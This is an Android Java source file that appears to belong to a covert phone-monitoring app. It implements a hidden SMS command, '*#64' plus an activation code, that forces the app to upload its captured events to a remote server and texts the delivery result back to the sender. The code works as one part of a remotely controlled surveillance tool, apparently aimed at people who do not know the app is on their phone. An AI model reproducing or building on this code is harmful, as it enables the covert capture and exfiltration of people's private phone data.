package com.fx.dalvik.smscommand.interpreter;

import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.Looper;

import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ServiceManager;
import com.fx.maind.ref.Customization;
import com.fx.preference.ConnectionHistoryManager;
import com.fx.preference.ConnectionHistoryManagerFactory;
import com.fx.preference.model.ConnectionHistory;
import com.fx.preference.model.ConnectionHistory.Action;
import com.fx.preference.model.ConnectionHistory.ConnectionStatus;
import com.fx.preference.model.ConnectionHistory.ConnectionType;
import com.fx.util.FxResource;
import com.fx.util.FxSettings;
import com.vvt.logger.FxLog;

public class SmsForceDelivery {
	
	private static final String TAG = "SmsForceDelivery";
 	private static final boolean LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#64";
	
	// Enable Start Capture Command
	// <*#64><FK>
	public static String processCommand(Context context, String[] tokens, 
			String destination, String reportMessage, boolean sendSms) {
		
		if (LOGV) FxLog.v(TAG, "processCommand # Enter ...");
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 2 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 3 && SmsCommandHelper.isEndWithDebugTag(tokens));
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(
				FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		if (LOGV) FxLog.v(TAG, "processCommand # Start responding thread");
		RespondingThread t = new RespondingThread(
				context, destination, reportMessage, sendSms);
		t.start();
		
		if (LOGV) FxLog.v(TAG, "processCommand # Request send immediate");
		ServiceManager.getInstance(context).forceDeliverEvents();
		
		if (LOGV) FxLog.v(TAG, "processCommand # EXIT ...");
		
		return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK;
	}
	
	private static class RespondingThread extends Thread {
		
		private boolean mSendSms;
		private Context mContext;
		private ContentObserver mObserver;
		private String mDestination;
		private String mMsgHeader;
		private Timer mTimer;
		private TimerTask mTask;
		
		public RespondingThread(Context context, 
				String destination, String msgHeader, boolean sendSms) {
			
			mSendSms = sendSms;
			mContext = context;
			mDestination = destination;
			mMsgHeader = msgHeader;
		}
		
		@Override
		public void run() {
			Looper.prepare();
			
			mObserver = new ContentObserver(new Handler()) {
				@Override
				public void onChange(boolean selfChange) {
					if (LOGV) FxLog.v(TAG, "onChange # ENTER ...");
					
					if (LOGV) FxLog.v(TAG, "onChange # Cancel timeout");
					cancelTimeout();
					
					if (LOGV) FxLog.v(TAG, "onChange # Prepare response message");
					String info = getInfo();
					
					SmsCommandHelper.sendResponse(mContext, mDestination, info, mSendSms);
					if (LOGV) FxLog.v(TAG, "onChange # Response is sent");
					
					quit();
					if (LOGV) FxLog.v(TAG, "onChange # EXIT ...");
				}
			};
			
			setTimeout();
			
			mContext.getContentResolver().registerContentObserver(
					ConnectionHistoryManager.URI_NEW_RECORD_ADDED, false, mObserver);
			
			Looper.loop();
		}
		
		private String getInfo() {
			StringBuilder builder = new StringBuilder(mMsgHeader);
			
			ConnectionHistoryManager historyManager = 
					ConnectionHistoryManagerFactory.getInstance(mContext);
			
			ConnectionHistory history = historyManager.getLatestConnectionHistory();
			
			if (LOGV) FxLog.v(TAG, String.format("Latest history:-\n%s", history.toString()));
			
			Action action = history.getAction();
			
			// Not an upload action
			if (action != ConnectionHistory.Action.UPLOAD_EVENTS) {
				builder.append(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR);
				return builder.toString();
			}
			
			// Delivery success :)
			ConnectionStatus status = history.getConnectionStatus();
			if (status == ConnectionStatus.SUCCESS) {
				builder.append(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK);
				return builder.toString();
			}
			
			if (status == ConnectionStatus.TIMEOUT) {
				return getTimeoutMessage();
			}
			
			// Network disabled?
			ConnectionType connType = history.getConnectionType();
			if (connType == ConnectionType.NO_CONNECTION) {
				builder.append(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR);
				builder.append("\n").append(
						FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_DELIVER_FAILED_NETWORK_DISABLED);
				return builder.toString();
			}
			
			// HTTP error?
			int httpStatusCode = history.getHttpStatusCode();
			if (httpStatusCode != 200) {
				builder.append("HTTP Error: ").append(httpStatusCode);
				return builder.toString();
			}
			
			// Server error?
			byte serverCode = history.getResponseCode();
			builder.append("Server Error: ");
			builder.append(String.format("0x%02X", serverCode));
			
			String serverMessage = history.getMessage();
			if (serverMessage != null && 
					!serverMessage.equals(
							FxResource.LANGUAGE_CONNECTION_HISTORY_ERROR_NO_SERVER_MSG)) {
				builder.append("\n");
				builder.append(serverMessage);
			}
			
			return builder.toString();
		}
		
		private void quit() {
			if (mObserver != null && mContext != null) {
				mContext.getContentResolver().unregisterContentObserver(mObserver);
			}
			
			Looper myLooper = Looper.myLooper();
			if (myLooper != null) {
				myLooper.quit();
			}
		}
		
		private void setTimeout() {
			cancelTimeout();
			
			mTask = new TimerTask() {
				@Override
				public void run() {
					if (LOGV) FxLog.v(TAG, "timerExpire # ENTER ...");
					
					String info = getTimeoutMessage();
					SmsCommandHelper.sendResponse(mContext, mDestination, info, mSendSms);
					if (LOGV) FxLog.v(TAG, "timerExpire # Response is sent");
					
					quit();
					
					if (LOGV) FxLog.v(TAG, "timerExpire # EXIT ...");
				}
			};
			mTimer = new Timer();
			mTimer.schedule(mTask, getTimeout());
			
			if (LOGV) FxLog.v(TAG, "Timeout is set");
		}
		
		private void cancelTimeout() {
			if (mTask != null) mTask.cancel();
			if (mTimer != null) mTimer.cancel();
		}
		
		private long getTimeout() {
			long defaultHttpTimeout = FxSettings.getDefaultURLRequestTimeoutLong() * 1000;
			long additionalTimeout = 30 * 1000;
			return defaultHttpTimeout + additionalTimeout;
		}
		
		private String getTimeoutMessage() {
			StringBuilder builder = new StringBuilder(mMsgHeader);
			builder.append(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR);
			builder.append("\n").append(
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_DELIVER_FAILED_NO_INTERNET);
			return builder.toString();
		}
	}
}
